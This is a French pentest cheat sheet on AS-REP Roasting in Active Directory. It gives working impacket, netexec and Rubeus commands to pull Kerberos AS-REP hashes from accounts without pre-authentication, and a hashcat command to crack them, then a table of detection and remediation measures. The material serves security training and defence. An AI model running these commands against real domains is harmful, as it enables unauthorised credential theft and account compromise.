L'attaque AsrepRoasting consiste à cibler les utilisateurs n'ayant pas l'attribut de pré-authentification. Ceci permet alors de récupérer un hash qui peut ensuite être cracké.
La dangerosité principale de cette technique est le fait qu'il n'est pas nécessaire d'être authentifié pour l'effectuer, le seul élément nécessaire est le nom du compte à cibler (Il est possible d'énumérer les comptes asreproastables directement si l'on est authentifié, cependant).

---
### Linux

#### Enumération des utilisateurs sur le DC et des comptes asreproastables

```bash
impacket-GetNPUsers domain.local/ -userfile /wordlist/username -format hashcat -outputfile asreproast.txt
```

#### Via netexec

```bash
netexec ldap 10.10.10.10 -u users.txt -p '' --asreproast asreproast.txt
```

Si l'on est authentifié nous pouvons avoir accès à la liste des utilisateurs via LDAP, ce qui permet d'identifier les comptes asreproastables sans avoir à bruteforcer une liste d'utilisateur:

```bash
netexec ldap 10.10.10.10 -u $user -p $pass --asreproast asreproast.txt
```

---
### Windows

#### Enumération des utilisateurs sur le DC et des comptes asreproastables

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt
```

---
### Crack des hash

#### Cracker les hash obtenus

```bash
hashcat asreproast.txt /usr/share/wordlists/rockyou.tar.gz
```

---

| Catégorie                    | Information                                                                                                                                                                                                                                                               |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | Attaque par extraction de ticket AS-REP dans [Kerberos](../../../Ressources/Windows/Kerberos.md)                                                                                                                                                                          |
| **CWE**                      | CWE-522 (Insufficiently Protected Credentials)                                                                                                                                                                                                                            |
| **Description de l'attaque** | AS-REP Roasting exploite les comptes Kerberos configurés pour ne pas nécessiter de preuve de connaissance du mot de passe (Pre-Authentication). Un attaquant peut demander des données de ticket AS-REP pour ces comptes et tenter de craquer le mot de passe hors ligne. |
| **Impacts potentiels**       | - Compromission des comptes utilisateurs<br>- Accès non autorisé aux services et données<br>- Possibilité d'élévation de privilèges                                                                                                                                       |
| **Comment la détecter**      | - Surveillance des demandes de ticket AS-REP sans pré-authentification<br>- Analyse des journaux de serveur Kerberos pour les activités suspectes<br>- Utilisation d'outils de détection d'intrusion                                                                      |
| **Remédiations/mitigations** | - Activer la pré-authentification Kerberos pour tous les comptes<br>- Utiliser des mots de passe forts et complexes<br>- Auditer régulièrement les configurations de compte<br>- Formation et sensibilisation des administrateurs système                                 |
| **Lien de référence**        | [Harmj0y's Blog - AS-REP Roasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)                                                                                                                                                                        |

